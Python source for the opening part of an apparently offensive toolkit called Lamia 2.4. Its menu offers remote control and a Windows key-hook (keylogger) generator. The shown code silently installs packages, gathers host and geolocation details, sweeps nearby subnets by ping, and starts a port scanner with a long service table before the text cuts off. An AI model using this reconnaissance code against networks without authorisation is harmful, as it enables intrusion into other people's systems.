# -*- coding: utf-8 -*-
# !/usr/bin/env python3

import time
import ctypes
import sys
import smtplib
import os
import platform
import socket
import getpass
import subprocess
import requests
import random
from threading import Thread
from itertools import product
from os import path
from queue import Queue


class Clear:
    """Clearing screen based on lambda function"""

    if os.name == 'nt':
        clear = lambda: os.system('cls')
    else:
        clear = lambda: os.system('clear')


reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
missing = False
python_version = platform.python_version()
python_version = python_version.split('.')
python_version = python_version[0] + '.' + python_version[1]

if ('getmac' or 'pythonping' or 'paramiko') not in installed_packages:
    missing = True
    print('Missing required package! Lamia will install the missing packages automatically\nWait...')

try:
    from pythonping import ping
except (NameError, ModuleNotFoundError):
    subprocess.call('pip install pythonping', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install pythonping', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

try:
    import getmac
except (ImportError, ModuleNotFoundError):
    subprocess.call('pip install getmac', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install getmac', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

try:
    import paramiko
except (ImportError, ModuleNotFoundError):
    subprocess.call('pip install paramiko', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install paramiko', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
try:
    from colorama import init
except (ImportError, ModuleNotFoundError):
    subprocess.call('pip install colorama', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install colorama', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

try:
    from termcolor import cprint
    from termcolor import colored
except (ImportError, ModuleNotFoundError):
    subprocess.call('pip install termcolor', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install termcolor', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

try:
    from pyfiglet import figlet_format
except (ImportError, ModuleNotFoundError):
    subprocess.call('pip install pyfiglet', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL) if os.name == 'nt' else subprocess.call('pip3 install pyfiglet', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

if os.name == 'nt':
    try:
        import pynput
    except (ImportError, ModuleNotFoundError):
        subprocess.call('pip install pynput', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    try:
        import pythoncom
    except (ImportError, ModuleNotFoundError):
        subprocess.call('pip install pywin32', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    try:
        import playsound
    except (ImportError, ModuleNotFoundError):
        subprocess.call('pip install playsound', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    try:
        import requests
    except (ImportError, ModuleNotFoundError):
        subprocess.call('pip install requests', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    try:
        from geolite2 import geolite2
    except (ImportError, ModuleNotFoundError):
        subprocess.call('pip install maxminddb-geolite2', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

if missing:
    os.execv(sys.executable, ['python3'] + [os.path.basename(__file__)]) if os.name != 'nt' else os.execv(sys.executable, ['python'] + [sys.argv[0]])


class Lamia:

    def __repr__(self):
        return f"{self.__class__.__name__}"

    @staticmethod
    def start_up():
        welcome_message = WelcomeMessage()
        welcome_message.lamia_load_screen()
        user_info = UserInfo()
        user_info.user_information()
        Clear.clear()
        MainMenu().menu()


class Bcolors:
    """Notification colors"""

    Magenta = "\033[35m"
    Pass = "\033[32m"
    Error = "\033[31m"
    WARNING = "\033[33m"
    LGRAY = "\033[0;37m"
    ENDC = '\033[0m'


class WelcomeMessage:
    """Lamia Startup Message"""

    init(strip=not sys.stdout.isatty())

    def __init__(self):
        self.load: str = f''
        self.start_up_message: str = figlet_format("Lamia   2 . 4")
        self.check_compatibility: str = "The script checks compatibility..."

    def lamia_load_screen(self):
        for char in self.load:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.1)
        time.sleep(0.1)
        Clear.clear()
        for char in self.start_up_message:
            sys.stdout.write(colored(char, "magenta"))
            sys.stdout.flush()
            time.sleep(0.01)
        time.sleep(3)
        Clear.clear()
        for char in self.check_compatibility:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)
        time.sleep(1)


class UserInfo:
    user_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    user_ip.connect(("8.8.8.8", 80))
    user_ip = user_ip.getsockname()[0]

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        self.user_name: str = getpass.getuser()
        try:
            self.user_public_ip: str = requests.get('https://api.ipify.org').text
        except requests.exceptions.ConnectionError:
            self.user_public_ip = 'Unknown'
        self.city: str = ''
        self.country: str = ''
        self.location: dict = {}

    def user_information(self):
        if os.name == 'nt' or os.name == 'posix':
            if os.name == 'posix':
                permissions = os.getuid()
                if permissions != 0:
                    print(
                        f'{Bcolors.Error}ERROR!{Bcolors.ENDC}You must run script as root! Write: {Bcolors.WARNING}sudo python3 Lamia.py{Bcolors.ENDC}')
                    time.sleep(3)
                    sys.exit()
                elif permissions == 0:
                    pass

            time.sleep(1)
            Clear.clear()
            user_platform = platform.system() + ' ' + platform.release()
            user_platform_version = platform.version()
            user_mac = getmac.get_mac_address()
            if os.name == 'nt' and self.user_public_ip != 'Unknown':
                reader = geolite2.reader()
                location = reader.get(self.user_public_ip)
                try:
                    self.city = (location['city']['names']['en'])
                except KeyError:
                    self.city = 'Unknown'
                self.country = (location['country']['names']['en'])
                self.location = (location['location'])
                self.latitude, self.longitude = self.location['latitude'], self.location['longitude']

            print(19 * '-' + f'{Bcolors.WARNING}WAIT !{Bcolors.ENDC}' + 19 * '-')
            time.sleep(0.25)
            print(f'Platform: {user_platform}' + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            time.sleep(0.25)
            print(f'Version: {user_platform_version}' + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            time.sleep(0.25)
            if UserInfo.user_ip != '127.0.0.1':
                print('IP:', UserInfo.user_ip, f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
                time.sleep(0.25)
                try:
                    if self.user_public_ip != 'Unknown':
                        print('Public IP:', self.user_public_ip, f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
                    else:
                        print('Public IP:', self.user_public_ip, f"{Bcolors.Error} CAN'T FIND!{Bcolors.ENDC}")
                except AttributeError:
                    pass
            else:
                print('IP:', UserInfo.user_ip, f'{Bcolors.Error} ERROR!{Bcolors.ENDC}')

            time.sleep(0.25)
            print('MAC:', user_mac + f'{Bcolors.Pass} OK!{Bcolors.ENDC}')
            time.sleep(0.25)
            if os.name == 'nt' and self.user_public_ip != 'Unknown':
                print('Country:', self.country + f'{Bcolors.Pass} FIND!{Bcolors.ENDC}')
                time.sleep(0.25)
                if self.city != 'Unknown':
                    print('City:', self.city + f'{Bcolors.Pass} FIND!{Bcolors.ENDC}')
                    time.sleep(0.25)
                else:
                    print('City:', self.city + f"{Bcolors.Error} CAN'T FIND!{Bcolors.ENDC}")
                    time.sleep(0.25)
                print(f'Latitude: {self.latitude} | Longitude: {self.longitude}' + f'{Bcolors.Pass} FIND!{Bcolors.ENDC}')
                time.sleep(0.25)
            print(20 * '-' + f'{Bcolors.Pass}OK !{Bcolors.ENDC}' + 20 * '-')
            os.system('pause') if os.name == 'nt' else input('Press any key to continue...')


class MainMenu:

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def menu(self):
        Clear.clear()
        print(25 * '-' + f'{Bcolors.Magenta}LAMIA VERSION 2.4{Bcolors.ENDC}' + 25 * '-')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}1.NETWORK SCANNER{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}2.REMOTE CONTROL{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}3.PASSWORD GENERATOR{Bcolors.ENDC}')
        time.sleep(0.25)
        if os.name != 'nt':
            print(
                f'{Bcolors.LGRAY}4.KEY-HOOK GENERATOR{Bcolors.ENDC} {Bcolors.Error}This module will not work in Linux !{Bcolors.ENDC}')
        else:
            print(f'{Bcolors.WARNING}4.KEY-HOOK GENERATOR{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}0.EXIT{Bcolors.ENDC}')
        time.sleep(0.25)
        print(70 * '-')
        main_menu_choice = str(input('> '))
        if main_menu_choice == '1':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                network_scanner = NetworkScanner()
                network_scanner.network_scanner_menu()

        if main_menu_choice == '2':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                remote_control = RemoteControl()
                remote_control.remote_control_startup()

        if main_menu_choice == '3':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                password_generator = PasswordGenerator()
                password_generator.password_generator_start()

        if main_menu_choice == '4' and os.name == 'nt':
            if __name__ == '__main__':
                time.sleep(1)
                Clear.clear()
                key_hook = KeyHook()
                key_hook.key_hook_check_compatibility()

        if main_menu_choice == '0' or main_menu_choice == 0:
            close_message = 'Exit...'
            for char in close_message:
                sys.stdout.write(char)
                sys.stdout.flush()
                time.sleep(0.1)
            print('\n')
            sys.exit(0)
        else:
            print(
                f'{Bcolors.Error}Wrong choice or module is not available on this platform or on this python version!{Bcolors.ENDC}')
            time.sleep(2)
            Clear.clear()
            MainMenu().menu()


class PossibleAreaNetworks:

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __call__(self) -> list:
        return self.scanned_networks

    def __init__(self):
        self.scanned_networks: list = []
        thread = Thread(target=self.scan_possible_area_networks, args=())
        thread.daemon = True
        thread.start()

    def scan_possible_area_networks(self):
        possible_area = []
        parts_ip = UserInfo.user_ip.split('.')
        part_0, part_1 = parts_ip[0], parts_ip[1]
        user_recommended_ip = part_0 + '.' + part_1 + '.'
        for num in range(0, 256):
            if num == 255:
                pass
            ip = f'{user_recommended_ip}{num}.1'
            command = ping(f'{ip}', timeout=0.1, count=1)
            if command.success():
                possible_area.append(ip)
        self.scanned_networks = list(dict.fromkeys(possible_area))


class NetworkScanner(UserInfo):
    start_time: float
    again = 0

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()
        self.ip: str = ''
        self.ip_list: list = []
        self.hostname: str = ''
        self.mac: str = ''
        self.platform: str = ''
        self.network_scanner_module_choice = None
        self.port: int = 0
        self.port_range: int = 11111000111
        self.type_of_port_scanning: bool = True
        self.service: str = ''
        self.ActiveHosts: str = ''
        self.check_default: str = ''
        self.network_scanner_module: str = ''
        self.OpenPortsAndServices: dict = {}
        self.all_services: dict = {3: 'compressnet', 5: 'rje', 7: 'echo', 9: 'discard', 11: 'systat', 13: 'daytime', 15: 'netstat', 17: 'qotd', 19: 'chargen', 20: 'ftp-data', 21: 'ftp', 22: 'ssh',
                                   23: 'telnet',
                                   24: 'priv-mail',
                                   25: 'smtp', 26: 'rsftp', 27: 'nsw-fe', 29: 'msg-icp', 31: 'msg-auth', 33: 'dsp', 35: 'priv-print', 37: 'time', 38: 'rap', 39: 'rlp', 41: 'graphics',
                                   42: 'nameserver', 43: 'whois',
                                   44: 'mpm-flags',
                                   45: 'mpm', 46: 'mpm-snd', 47: 'ni-ftp', 48: 'auditd', 49: 'tacacs', 50: 're-mail-ck', 51: 'la-maint', 52: 'xns-time', 53: 'domain', 54: 'xns-ch', 55: 'isi-gl',
                                   56: 'xns-auth',
                                   57: 'priv-term',
                                   58: 'xns-mail', 59: 'priv-file', 61: 'ni-mail', 62: 'acas', 63: 'via-ftp', 64: 'covia', 65: 'tacacs-ds', 66: 'sqlnet', 67: 'dhcps', 68: 'dhcpc', 69: 'tftp',
                                   70: 'gopher', 71: 'netrjs-1',
                                   72: 'netrjs-2', 73: 'netrjs-3', 74: 'netrjs-4', 75: 'priv-dial', 76: 'deos', 77: 'priv-rje', 80: 'http ', 81: 'hosts2-ns', 82: 'xfer', 84: 'ctf', 85: 'mit-ml-dev',
                                   86: 'mfcobol',
                                   87: 'priv-term-l',
                                   88: 'kerberos-sec', 89: 'su-mit-tg', 90: 'dnsix', 91: 'mit-dov', 92: 'npp', 93: 'dcp', 94: 'objcall', 95: 'supdup', 96: 'dixie', 97: 'swift-rvf', 98: 'linuxconf',
                                   99: 'metagram',
                                   100: 'newacct',
                                   101: 'hostname', 102: 'iso-tsap', 103: 'gppitnp', 104: 'acr-nema', 105: 'csnet-ns', 106: 'pop3pw', 107: 'rtelnet', 108: 'snagas', 109: 'pop2', 110: 'pop3',
                                   111: 'rpcbind', 112: 'mcidas',
                                   113: 'ident', 114: 'audionews', 115: 'sftp', 116: 'ansanotify', 117: 'uucp-path', 118: 'sqlserv', 119: 'nntp', 120: 'cfdptkt', 121: 'erpc', 122: 'smakynet',
                                   123: 'ntp', 124: 'ansatrader',
                                   125: 'locus-map', 126: 'unitary', 127: 'locus-con', 128: 'gss-xlicen', 129: 'pwdgen', 130: 'cisco-fna', 131: 'cisco-tna', 132: 'cisco-sys', 133: 'statsrv',
                                   134: 'ingres-net', 135: 'msrpc',
                                   136: 'profile', 137: 'netbios-ns', 138: 'netbios-dgm', 139: 'netbios-ssn', 140: 'emfis-data', 141: 'emfis-cntl', 142: 'bl-idm', 143: 'imap', 145: 'uaac',
                                   146: 'iso-tp0', 147: 'iso-ip',
                                   148: 'cronus',
                                   149: 'aed-512', 150: 'sql-net', 151: 'hems', 152: 'bftp', 153: 'sgmp', 154: 'netsc-prod', 155: 'netsc-dev', 156: 'sqlsrv', 157: 'knet-cmp', 158: 'pcmail-srv',
                                   159: 'nss-routing',
                                   160: 'sgmp-traps',
                                   161: 'snmp', 162: 'snmptrap', 163: 'cmip-man', 164: 'cmip-agent', 165: 'xns-courier', 166: 's-net', 167: 'namp', 168: 'rsvd', 169: 'send', 170: 'print-srv',
                                   171: 'multiplex', 172: 'cl-1',
                                   173: 'xyplex-mux', 174: 'mailq', 175: 'vmnet', 176: 'genrad-mux', 177: 'xdmcp', 178: 'nextstep', 179: 'bgp', 180: 'ris', 181: 'unify', 182: 'audit', 183: 'ocbinder',
                                   184: 'ocserver',
                                   185: 'remote-kis', 186: 'kis', 187: 'aci', 188: 'mumps', 189: 'qft', 190: 'gacp', 191: 'prospero', 192: 'osu-nms', 193: 'srmp', 195: 'dn6-nlm-aud',
                                   196: 'dn6-smm-red', 198: 'dls-mon',
                                   199: 'smux',
                                   200: 'src', 201: 'at-rtmp', 202: 'at-nbp', 203: 'at-3', 204: 'at-echo', 205: 'at-5', 206: 'at-zis', 207: 'at-7', 208: 'at-8', 209: 'tam', 210: 'z39.50',
                                   211: '914c-g', 212: 'anet',
                                   213: 'ipx',
                                   214: 'vmpwscs', 215: 'softpc', 216: 'atls', 217: 'dbase', 218: 'mpp', 219: 'uarps', 220: 'imap3', 221: 'fln-spx', 222: 'rsh-spx', 223: 'cdc', 224: 'masqdialer',
                                   242: 'direct',
                                   243: 'sur-meas',
                                   244: 'dayna', 245: 'link', 246: 'dsp3270', 247: 'subntbcst_tftp', 248: 'bhfhs', 256: 'fw1-secureremote', 257: 'fw1-mc-fwmodule', 258: 'fw1-mc-gui', 259: 'esro-gen',
                                   260: 'openport',
                                   261: 'nsiiops',
                                   262: 'arcisdms', 263: 'hdap', 264: 'bgmp', 265: 'maybe-fw1', 266: 'sst', 267: 'td-service', 268: 'td-replica', 269: 'manet', 270: 'gist', 271: 'pt-tls',
                                   280: 'http-mgmt',
                                   281: 'personal-link',
                                   282: 'cableport-ax', 283: 'rescap', 284: 'corerjd', 287: 'k-block', 308: 'novastorbakcup', 309: 'entrusttime', 310: 'bhmds', 311: 'asip-webadmin', 312: 'vslmp',
                                   313: 'magenta-logic',
                                   314: 'opalis-robot', 315: 'dpsi', 316: 'decauth', 317: 'zannet', 318: 'pkix-timestamp', 319: 'ptp-event', 320: 'ptp-general', 322: 'rtsps', 323: 'rpki-rtr',
                                   324: 'rpki-rtr-tls',
                                   333: 'texar',
                                   344: 'pdap', 345: 'pawserv', 346: 'zserv', 347: 'fatserv', 348: 'csi-sgwp', 350: 'matip-type-a', 351: 'matip-type-b', 352: 'dtag-ste-sb', 353: 'ndsauth',
                                   354: 'bh611', 355: 'datex-asn',
                                   356: 'cloanto-net-1', 357: 'bhevent', 358: 'shrinkwrap', 359: 'tenebris_nts', 360: 'scoi2odialog', 361: 'semantix', 362: 'srssend', 363: 'rsvp_tunnel',
                                   364: 'aurora-cmgr', 365: 'dtk',
                                   366: 'odmr',
                                   367: 'mortgageware', 368: 'qbikgdp', 369: 'rpc2portmap', 370: 'codaauth2', 371: 'clearcase', 372: 'ulistserv', 373: 'legent-1', 374: 'legent-2', 375: 'hassle',
                                   376: 'nip', 377: 'tnETOS',
                                   378: 'dsETOS', 379: 'is99c', 380: 'is99s', 383: 'hp-alarm-mgr', 384: 'arns', 385: 'ibm-app', 386: 'asa', 387: 'aurp', 388: 'unidata-ldm', 389: 'ldap', 390: 'uis',
                                   391: 'synotics-relay',
                                   392: 'synotics-broker', 393: 'dis', 394: 'embl-ndt', 396: 'netware-ip', 397: 'mptn', 398: 'kryptolan', 399: 'iso-tsap-c2', 400: 'work-sol', 401: 'ups', 402: 'genie',
                                   403: 'decap',
                                   404: 'nced',
                                   405: 'ncld', 406: 'imsp', 407: 'timbuktu', 408: 'prm-sm', 409: 'prm-nm', 410: 'decladebug', 411: 'rmt', 412: 'synoptics-trap', 413: 'smsp', 414: 'infoseek',
                                   415: 'bnet',
                                   416: 'silverplatter',
                                   417: 'onmux', 418: 'hyper-g', 419: 'ariel1', 420: 'smpte', 421: 'ariel2', 422: 'ariel3', 423: 'opc-job-start', 424: 'opc-job-track', 425: 'icad-el', 426: 'smartsdp',
                                   427: 'svrloc',
                                   428: 'ocs_cmu',
                                   429: 'ocs_amu', 430: 'utmpsd', 431: 'utmpcd', 432: 'iasd', 433: 'nnsp', 434: 'mobileip-agent', 435: 'mobilip-mn', 436: 'dna-cml', 437: 'comscm', 438: 'dsfgw',
                                   439: 'dasp', 440: 'sgcp',
                                   441: 'decvms-sysmgt', 442: 'cvc_hostd', 443: 'https', 444: 'snpp', 445: 'microsoft-ds', 446: 'ddm-rdb', 447: 'ddm-dfm', 448: 'ddm-ssl', 449: 'as-servermap',
                                   450: 'tserver',
                                   451: 'sfs-smp-net',
                                   452: 'sfs-config', 456: 'macon', 457: 'scohelp', 458: 'appleqtc', 459: 'ampr-rcmd', 460: 'skronk', 461: 'datasurfsrv', 462: 'datasurfsrvsec', 463: 'alpes',
                                   464: 'kpasswd5', 465: 'smtps',
                                   466: 'digital-vrc', 467: 'mylex-mapd', 468: 'photuris', 469: 'rcp', 470: 'scx-proxy', 471: 'mondex', 472: 'ljk-login', 473: 'hybrid-pop', 474: 'tn-tl-w1',
                                   475: 'tcpnethaspsrv',
                                   476: 'tn-tl-fd1',
                                   477: 'ss7ns', 478: 'spsc', 479: 'iafserver', 480: 'loadsrv', 481: 'dvs', 482: 'bgs-nsi', 483: 'ulpnet', 484: 'integra-sme', 485: 'powerburst', 486: 'sstats',
                                   487: 'saft', 488: 'gss-http',
                                   489: 'nest-protocol', 490: 'micom-pfs', 491: 'go-login', 492: 'ticf-1', 493: 'ticf-2', 494: 'pov-ray', 495: 'intecourier', 496: 'pim-rp-disc', 497: 'retrospect',
                                   498: 'siam',
                                   499: 'iso-ill',
                                   500: 'isakmp', 501: 'stmf', 502: 'mbap', 503: 'intrinsa', 504: 'citadel', 505: 'mailbox-lm', 506: 'ohimsrv', 507: 'crs', 508: 'xvttp', 509: 'snare', 510: 'fcp',
                                   511: 'passgo', 512: 'exec',
                                   513: 'login', 514: 'shell', 515: 'printer', 516: 'videotex', 517: 'talk', 518: 'ntalk', 519: 'utime', 520: 'efs', 521: 'ripng', 522: 'ulp', 523: 'ibm-db2',
                                   524: 'ncp', 525: 'timed',
                                   526: 'tempo',
                                   527: 'stx', 528: 'custix', 530: 'courier', 531: 'conference', 532: 'netnews', 533: 'netwall', 534: 'mm-admin', 535: 'iiop', 536: 'opalis-rdv', 538: 'gdomap',
                                   539: 'apertus-ldp',
                                   540: 'uucp',
                                   541: 'uucp-rlogin', 542: 'commerce', 543: 'klogin', 544: 'kshell', 546: 'dhcpv6-client', 547: 'dhcpv6-server', 548: 'afp', 549: 'idfp', 550: 'new-rwho',
                                   551: 'cybercash',
                                   552: 'deviceshare',
                                   553: 'pirp', 554: 'rtsp', 555: 'dsf', 556: 'remotefs', 557: 'openvms-sysipc', 558: 'sdnskmp', 559: 'teedtap', 560: 'rmonitor', 561: 'monitor', 562: 'chshell',
                                   563: 'snews', 564: '9pfs',
                                   565: 'whoami', 566: 'streettalk', 567: 'banyan-rpc', 568: 'ms-shuttle', 569: 'ms-rome', 570: 'meter', 571: 'umeter', 572: 'sonar', 573: 'banyan-vip',
                                   574: 'ftp-agent', 575: 'vemmi',
                                   576: 'ipcd',
                                   577: 'vnas', 578: 'ipdd', 579: 'decbsrv', 580: 'sntp-heartbeat', 581: 'bdp', 582: 'scc-security', 583: 'philips-vc', 584: 'keyserver', 585: 'imap4-ssl',
                                   586: 'password-chg',
                                   587: 'submission',
                                   588: 'cal', 589: 'eyelink', 590: 'tns-cml', 592: 'eudora-set', 593: 'http-rpc-epmap', 594: 'tpip', 595: 'cab-protocol', 596: 'smsd', 597: 'ptcnameservice',
                                   598: 'sco-websrvrmg3',
                                   599: 'acp',
                                   600: 'ipcserver', 601: 'syslog-conn', 602: 'xmlrpc-beep', 603: 'mnotes', 604: 'tunnel', 605: 'soap-beep', 606: 'urm', 607: 'nqs', 608: 'sift-uft', 609: 'npmp-trap',
                                   610: 'npmp-local',
                                   611: 'npmp-gui', 612: 'hmmp-ind', 613: 'hmmp-op', 614: 'sshell', 615: 'sco-inetmgr', 616: 'sco-sysmgr', 617: 'sco-dtmgr', 618: 'dei-icda', 619: 'compaq-evm',
                                   620: 'sco-websrvrmgr',
                                   621: 'escp-ip',
                                   622: 'collaborator', 623: 'oob-ws-http', 624: 'cryptoadmin', 625: 'apple-xsrvr-admin', 626: 'apple-imap-admin', 627: 'passgo-tivoli', 628: 'qmqp', 629: '3com-amp3',
                                   630: 'rda', 631: 'ipp',
                                   632: 'bmpp', 633: 'servstat', 634: 'ginad', 635: 'rlzdbase', 636: 'ldapssl', 637: 'lanserver', 638: 'mcns-sec', 639: 'msdp', 640: 'entrust-sps', 641: 'repcmd',
                                   642: 'esro-emsdp',
                                   643: 'sanity',
                                   644: 'dwr', 645: 'pssc', 646: 'ldp', 647: 'dhcp-failover', 648: 'rrp', 649: 'cadview-3d', 650: 'obex', 651: 'ieee-mms', 652: 'hello-port', 653: 'repscmd',
                                   654: 'aodv', 655: 'tinc',
                                   656: 'spmp',
                                   657: 'rmc', 658: 'tenfold', 660: 'mac-srvr-admin', 661: 'hap', 662: 'pftp', 663: 'purenoise', 664: 'secure-aux-bus', 665: 'sun-dr', 666: 'doom', 667: 'disclose',
                                   668: 'mecomm',
                                   669: 'meregister',
                                   670: 'vacdsm-sws', 671: 'vacdsm-app', 672: 'vpps-qua', 673: 'cimplex', 674: 'acap', 675: 'dctp', 676: 'vpps-via', 677: 'vpp', 678: 'ggf-ncp', 679: 'mrm',
                                   680: 'entrust-aaas',
                                   681: 'entrust-aams',
                                   682: 'xfr', 683: 'corba-iiop', 684: 'corba-iiop-ssl', 685: 'mdc-portmapper', 686: 'hcp-wismar', 687: 'asipregistry', 688: 'realm-rusd', 689: 'nmap', 690: 'vatp',
                                   691: 'resvc',
                                   692: 'hyperwave-isp',
                                   693: 'connendp', 694: 'ha-cluster', 695: 'ieee-mms-ssl', 696: 'rushd', 697: 'uuidgen', 698: 'olsr', 699: 'accessnetwork', 701: 'lmp', 702: 'iris-beep', 704: 'elcsd',
                                   705: 'agentx',
                                   706: 'silc',
                                   707: 'borland-dsj', 709: 'entrustmanager', 710: 'entrust-ash', 711: 'cisco-tdp', 712: 'tbrpf', 713: 'iris-xpc', 714: 'iris-xpcs', 715: 'iris-lwz', 716: 'pana',
                                   723: 'omfs',
                                   729: 'netviewdm1',
                                   730: 'netviewdm2', 731: 'netviewdm3', 740: 'netcp', 741: 'netgw', 742: 'netrcs', 744: 'flexlm', 747: 'fujitsu-dev', 748: 'ris-cm', 749: 'kerberos-adm',
                                   750: 'kerberos',
                                   751: 'kerberos_master',
                                   752: 'qrh', 753: 'rrh', 754: 'krb_prop', 758: 'nlogin', 759: 'con', 760: 'krbupdate', 761: 'kpasswd', 762: 'quotad', 763: 'cycleserv', 764: 'omserv',
                                   767: 'phonebook', 769: 'vid',
                                   771: 'rtip',
                                   772: 'cycleserv2', 773: 'submit', 774: 'rpasswd', 775: 'entomb', 776: 'wpages', 777: 'multiling-http', 780: 'wpgs', 781: 'hp-collector', 782: 'hp-managed-node',
                                   783: 'spamassassin',
                                   786: 'concert',
                                   787: 'qsc', 799: 'controlit', 800: 'mdbs_daemon', 801: 'device', 802: 'mbap-s', 808: 'ccproxy-http', 810: 'fcp-udp', 828: 'itm-mcell-s', 829: 'pkix-3-ca-ra',
                                   830: 'netconf-ssh',
                                   831: 'netconf-beep',
                                   832: 'netconfsoaphttp', 833: 'netconfsoapbeep', 847: 'dhcp-failover2', 848: 'gdoi', 853: 'domain-s', 854: 'dlep', 861: 'owamp-control', 862: 'twamp-control',
                                   871: 'supfilesrv',
                                   873: 'rsync',
                                   886: 'iclcnet-locate', 887: 'iclcnet_svinfo', 888: 'accessbuilder', 898: 'sun-manageconsole', 900: 'omginitialrefs', 901: 'samba-swat', 902: 'iss-realsecure',
                                   903: 'iss-console-mgr',
                                   910: 'kink',
                                   911: 'xact-backup', 912: 'apex-mesh', 913: 'apex-edge', 950: 'oftep-rpc', 953: 'rndc', 975: 'securenetpro-sensor', 989: 'ftps-data', 990: 'ftps', 991: 'nas',
                                   992: 'telnets', 993: 'imaps',
                                   994: 'ircs', 995: 'pop3s', 996: 'xtreelic', 997: 'maitrd', 998: 'busboy', 999: 'garcon', 1000: 'cadlock', 1001: 'webpush', 1002: 'windows-icfw', 1008: 'ufsd',
                                   1010: 'surf', 1021: 'exp1',
                                   1022: 'exp2', 1023: 'netvenuechat', 1025: 'NFS-or-IIS', 1026: 'LSA-or-nterm', 1027: 'IIS', 1029: 'ms-lsa', 1030: 'iad1', 1031: 'iad2', 1032: 'iad3', 1033: 'netinfo',
                                   1034: 'zincite-a',
                                   1035: 'multidropper', 1036: 'nsstp', 1037: 'ams', 1038: 'mtqp', 1039: 'sbl', 1040: 'netsaint', 1041: 'danf-ak2', 1042: 'afrog', 1043: 'boinc', 1044: 'dcutility',
                                   1045: 'fpitp',
                                   1046: 'wfremotertm',
                                   1047: 'neod1', 1048: 'neod2', 1049: 'td-postman', 1050: 'java-or-OTGfileshare', 1051: 'optima-vnet', 1052: 'ddt', 1053: 'remote-as', 1054: 'brvread',
                                   1055: 'ansyslmd', 1056: 'vfo',
                                   1057: 'startron',
                                   1058: 'nim', 1059: 'nimreg', 1060: 'polestar', 1061: 'kiosk', 1062: 'veracity', 1063: 'kyoceranetdev', 1064: 'jstel', 1065: 'syscomlan', 1066: 'fpo-fns',
                                   1067: 'instl_boots',
                                   1068: 'instl_bootc',
                                   1069: 'cognex-insight', 1070: 'gmrupdateserv', 1071: 'bsquare-voip', 1072: 'cardax', 1073: 'bridgecontrol', 1074: 'warmspotMgmt', 1075: 'rdrmshc',
                                   1076: 'sns_credit', 1077: 'imgames',
                                   1078: 'avocent-proxy', 1079: 'asprovatalk', 1080: 'socks', 1081: 'pvuniwien', 1082: 'amt-esd-prot', 1083: 'ansoft-lm-1', 1084: 'ansoft-lm-2', 1085: 'webobjects',
                                   1086: 'cplscrambler-lg',
                                   1087: 'cplscrambler-in', 1088: 'cplscrambler-al', 1089: 'ff-annunc', 1090: 'ff-fms', 1091: 'ff-sm', 1092: 'obrpd', 1093: 'proofd', 1094: 'rootd', 1095: 'nicelink',
                                   1096: 'cnrprotocol',
                                   1097: 'sunclustermgr', 1098: 'rmiactivation', 1099: 'rmiregistry', 1100: 'mctp', 1101: 'pt2-discover', 1102: 'adobeserver-1', 1103: 'xaudio', 1104: 'xrl',
                                   1105: 'ftranhc',
                                   1106: 'isoipsigport-1',
                                   1107: 'isoipsigport-2', 1108: 'ratio-adp', 1109: 'kpop', 1110: 'nfsd-status', 1111: 'lmsocialserver', 1113: 'ltp-deepspace', 1114: 'mini-sql', 1115: 'ardus-trns',
                                   1116: 'ardus-cntl',
                                   1117: 'ardus-mtrns', 1118: 'sacred', 1119: 'bnetgame', 1120: 'bnetfile', 1121: 'rmpp', 1122: 'availant-mgr', 1123: 'murray', 1124: 'hpvmmcontrol',
                                   1125: 'hpvmmagent', 1126: 'hpvmmdata',
                                   1127: 'supfiledbg', 1128: 'saphostctrl', 1129: 'saphostctrls', 1130: 'casp', 1131: 'caspssl', 1132: 'kvm-via-ip', 1133: 'dfn', 1134: 'aplx', 1135: 'omnivision',
                                   1136: 'hhb-gateway',
                                   1137: 'trim',
                                   1138: 'encrypted_admin', 1139: 'cce3x', 1140: 'autonoc', 1141: 'mxomss', 1142: 'edtools', 1143: 'imyx', 1144: 'fuscript', 1145: 'x9-icue', 1146: 'audit-transfer',
                                   1147: 'capioverlan',
